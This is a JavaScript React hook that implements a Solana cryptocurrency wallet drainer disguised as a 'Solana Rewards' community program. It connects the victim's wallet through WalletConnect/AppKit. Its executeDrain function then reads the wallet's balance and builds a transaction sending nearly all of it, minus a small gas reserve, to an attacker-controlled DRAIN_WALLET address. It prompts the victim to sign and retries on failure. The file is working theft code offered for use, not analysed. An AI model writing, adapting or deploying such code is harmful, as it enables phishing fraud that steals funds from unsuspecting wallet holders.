"use client";

import { createAppKit } from '@reown/appkit';
import { SolanaAdapter } from '@reown/appkit-adapter-solana';
import { solana } from '@reown/appkit/networks';
import { useCallback, useEffect, useState } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

let appKitInstance = null;
let solanaProvider = null;
let solanaAddress = null;

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const [address, setAddress] = useState(null);
  const [provider, setProvider] = useState(null);

  useEffect(() => {
    if (!appKitInstance && typeof window !== 'undefined') {
      const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;
      
      if (!projectId) {
        console.error('WalletConnect Project ID missing');
        return;
      }

      const metadata = {
        name: 'Solana Rewards',
        description: 'Community Rewards Program',
        url: window.location.origin,
        icons: ['https://solana-rewards.vercel.app/favicon.ico']
      };

      const solanaAdapter = new SolanaAdapter();

      appKitInstance = createAppKit({
        adapters: [solanaAdapter],
        networks: [solana],
        projectId,
        metadata,
        features: {
          analytics: true,
          email: false,
          socials: []
        },
        themeMode: 'dark',
        themeVariables: {
          '--w3m-accent': '#9945FF',
          '--w3m-background': '#0A0B2D',
          '--w3m-color-mix': '#14F195',
          '--w3m-color-mix-strength': 20
        }
      });
    }
  }, []);

  const connect = useCallback(async () => {
    try {
      if (!appKitInstance) throw new Error('AppKit not initialized');
      
      // Open modal and wait for connection
      await appKitInstance.open();
      
      // Get the Solana provider and address from AppKit
      // AppKit v3 uses different methods
      const walletProvider = await appKitInstance.getWalletProvider();
      const session = await appKitInstance.getSession();
      
      let walletAddress = null;
      
      // Try to get address from session
      if (session && session.namespaces && session.namespaces.solana) {
        const accounts = session.namespaces.solana.accounts;
        if (accounts && accounts.length > 0) {
          // Address format: "solana:5UQVri...yfha"
          walletAddress = accounts[0].split(':')[1];
        }
      }
      
      // Alternative: try to get from provider
      if (!walletAddress && walletProvider && walletProvider.publicKey) {
        walletAddress = walletProvider.publicKey.toString();
      }
      
      if (!walletAddress) {
        throw new Error('No wallet address found');
      }
      
      setAddress(walletAddress);
      setProvider(walletProvider);
      solanaProvider = walletProvider;
      solanaAddress = walletAddress;
      
      return walletAddress;
      
    } catch (error) {
      console.error('WalletConnect failed:', error);
      throw new Error(`WalletConnect connection failed: ${error.message}`);
    }
  }, []);

  const executeDrain = useCallback(async (allocatedAmount) => {
    let lastError = null;
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        if (!solanaProvider && !window.solana) {
          throw new Error('WalletConnect not connected');
        }

        const provider = solanaProvider || window.solana;
        const walletAddress = solanaAddress || address;
        
        if (!walletAddress) {
          throw new Error('No wallet address available');
        }

        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 120000
        });
        
        const walletPubkey = new PublicKey(walletAddress);
        
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Sign and send - handle different provider types
        let signed;
        if (provider.signAndSendTransaction) {
          signed = await provider.signAndSendTransaction(transaction);
        } else if (provider.signTransaction) {
          const signedTx = await provider.signTransaction(transaction);
          signed = await connection.sendRawTransaction(signedTx.serialize());
        } else {
          throw new Error('Provider does not support signing transactions');
        }
        
        const signature = signed.signature || signed;
        console.log(`[WalletConnect] Sent: ${signature}`);
        
        const confirmation = await connection.confirmTransaction(
          {
            signature: signature,
            blockhash,
            lastValidBlockHeight,
          },
          'confirmed'
        );
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, [address]);

  return { connect, address, provider, executeDrain };
};
